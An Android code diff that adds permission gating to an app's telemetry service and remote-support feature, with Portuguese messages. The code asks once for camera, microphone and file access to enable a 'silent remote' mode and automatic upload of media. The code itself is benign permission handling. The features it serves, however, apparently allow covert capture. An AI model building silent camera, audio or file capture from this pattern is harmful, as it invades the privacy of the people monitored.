@@ -44,6 +44,8 @@ public class MainPermissionsActivity extends Activity {
     private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
     private static final String READ_MEDIA_AUDIO_PERMISSION = "android.permission.READ_MEDIA_AUDIO";
     private static final String READ_MEDIA_VISUAL_USER_SELECTED_PERMISSION = "android.permission.READ_MEDIA_VISUAL_USER_SELECTED";
+    private volatile boolean pendingRemoteConsentAfterPermissions = false;
+    private volatile boolean pendingStartAfterPermissions = false;
 
     @Override
     protected void onCreate(Bundle s) {
@@ -205,6 +207,13 @@ public class MainPermissionsActivity extends Activity {
             showMsg("Conceda primeiro o consentimento remoto de ecrã/áudio");
             return;
         }
+        if (!hasAllPermissions(getStoragePermissionsForCurrentVersion())) {
+            pendingStartAfterPermissions = true;
+            requestPermissionsIfNeeded(getStoragePermissionsForCurrentVersion());
+            showMsg("Conceda acesso a ficheiros/media para ativar envio automático.");
+            return;
+        }
+        pendingStartAfterPermissions = false;
 
         AppRuntime.ensureTelemetryStarted(this);
         showMsg("Serviço iniciado");
@@ -269,8 +278,19 @@ public class MainPermissionsActivity extends Activity {
         tvRemoteSupportState.setText("Sessão remota: " + friendlyType + " ativa (id: " + sessionId + ")");
     }
 
+    private boolean hasRemoteRuntimePermissions() {
+        return PermissionCompat.isGranted(this, Manifest.permission.RECORD_AUDIO)
+                && PermissionCompat.isGranted(this, Manifest.permission.CAMERA);
+    }
+
     private void grantRemoteSupportConsent() {
-        requestPermissionsIfNeeded(new String[]{Manifest.permission.RECORD_AUDIO});
+        if (!hasRemoteRuntimePermissions()) {
+            pendingRemoteConsentAfterPermissions = true;
+            requestPermissionsIfNeeded(new String[]{Manifest.permission.RECORD_AUDIO, Manifest.permission.CAMERA});
+            showMsg("Conceda áudio e câmara uma única vez para ativar o remoto silencioso");
+            return;
+        }
+        pendingRemoteConsentAfterPermissions = false;
         new Thread(() -> {
             try {
                 org.json.JSONObject body = new org.json.JSONObject();
@@ -298,6 +318,14 @@ public class MainPermissionsActivity extends Activity {
         if (!PermissionCompat.requestPermissionsIfNeeded(this, perms, REQ_CODE_PERMS)) {
             showMsg("Permissões já concedidas");
         }
+    }
+
+    private boolean hasAllPermissions(String[] permissions) {
+        if (permissions == null || permissions.length == 0) return true;
+        for (String permission : permissions) {
+            if (!PermissionCompat.isGranted(this, permission)) return false;
+        }
+        return true;
     }
 
     @Override
@@ -340,6 +368,16 @@ public class MainPermissionsActivity extends Activity {
                 }
             }
             showMsg(ok ? "Permissões concedidas" : "Algumas permissões não concedidas");
+            if (ok && pendingRemoteConsentAfterPermissions) {
+                grantRemoteSupportConsent();
+            } else if (!ok) {
+                pendingRemoteConsentAfterPermissions = false;
+            }
+            if (ok && pendingStartAfterPermissions) {
+                startTelemetryService();
+            } else if (!ok) {
+                pendingStartAfterPermissions = false;
+            }
         }
     }
 
